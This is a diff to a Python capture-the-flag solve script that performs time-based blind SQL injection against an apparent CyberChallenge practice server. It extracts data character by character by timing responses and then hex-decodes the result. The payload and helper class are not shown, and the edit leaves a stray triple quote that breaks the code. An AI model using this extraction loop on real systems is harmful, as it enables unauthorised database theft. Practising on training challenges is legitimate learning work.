@@ -1,5 +1,5 @@
 from inj_class import Inj
-import time 
+from time import time 
 
 
 inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')
@@ -10,17 +10,17 @@ i = 0
 
 while True:
     for c in dictionary:
-        i= i+1
-        print('prova ', i)
-        before_request = time.time()
-        question = payload.format(result + c)  
-        response, error = inj.blind(question)
-        total_time = time.time()-before_request 
+        before_request = time()
+        question = payload.format(result + c)
+        print(question)
+        response, error = inj.time(question)
+        total_time = time()-before_request 
         
         if total_time > 1:
+            print('found one')
             # match!
             result += c
-        break
+            break
     else:
-        break # yup, for loops in python have an else condition
+        break # yup, for loops in python have an else condition'''
 print(bytes.fromhex(result))
